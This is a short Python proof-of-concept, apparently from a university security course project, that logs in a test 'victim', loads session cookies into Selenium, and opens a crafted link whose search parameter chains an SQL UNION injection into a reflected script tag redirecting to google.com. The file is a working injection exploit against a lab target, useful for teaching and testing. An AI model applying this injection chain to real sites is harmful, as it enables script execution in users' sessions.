#!/usr/bin/env python3
import requests, sys
import urllib.parse
import time
from interface import *
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

if not (2 == len(sys.argv)):
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

s = requests.Session()
reset_app(s, url)

username = 'victim'
password = 'victim'
register(s, url, username=username, password=password)

cookie_dict = s.cookies.get_dict()


# victim clicks on attacker's link
xss = "window.location=`http://google.com`"
malicious_link = f"http://56cb2c11fc0868ed95fe9739052b47bc7770cb37b263113029d198840253.project.ssof.rnl.tecnico.ulisboa.pt/friends?search=%27+AND+1%3D0+UNION+SELECT+1%2C+2%2C+%27%3Cscript%3E{xss}%3C%2Fscript%3E%27%2C+4%2C+5+%23"
driver = webdriver.Chrome()
driver.get(url) # needed to set cookies in the right domain
for key in cookie_dict:
    driver.add_cookie({
        "name": key,
        "value": cookie_dict[key]
    })
driver.get(malicious_link)

print("[+] Waiting for selenium to execute XSS")
time.sleep(5)

# user redirected to google
assert "google.com" in driver.current_url
driver.close()

print("[+] Successfully executed XSS")

